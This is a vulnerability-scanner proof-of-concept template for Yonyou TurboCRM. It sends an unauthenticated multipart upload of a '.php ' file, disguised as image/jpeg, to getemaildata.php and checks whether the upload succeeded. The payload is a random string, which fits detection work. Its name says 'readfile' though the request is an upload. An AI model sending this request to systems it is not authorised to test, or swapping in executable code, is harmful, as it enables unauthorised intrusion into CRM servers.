name: yaml-poc-yonyou-yonyou_turbocrm-readfile-CT-660523
binding: 364c998b-1ee2-44d5-96eb-0c2658b4cd0f
detail:
    author: haiqing.chen
    vulnerability:
        id: a2cdc766-f625-478b-b4ec-f61f8564e002
        level: high
    warning: Harmless
transport: http
set:
    r1: randomInt(100000, 900000)
    randstr: randomLowercase(20)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ajax/getemaildata.php?DontCheckLogin=1
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykB9Y8HAxHjbXme1A
            body: |-
                ------WebKitFormBoundarykB9Y8HAxHjbXme1A
                Content-Disposition: form-data; name="file"; filename="{{r1}}.php "
                Content-Type: image/jpeg

                {{randstr}}
                ------WebKitFormBoundarykB9Y8HAxHjbXme1A
                Content-Disposition: form-data; name="upload"

                upload
                ------WebKitFormBoundarykB9Y8HAxHjbXme1A--
        expression: response.status == 200 && response.body_string.contains("tmp.mht") && response.body_string.contains('success":true')
        output:
            search: '"mht(?P<id>.*?).tmp.mht".submatch(response.body_string)'
            fid: search["id"]
expression: r0()
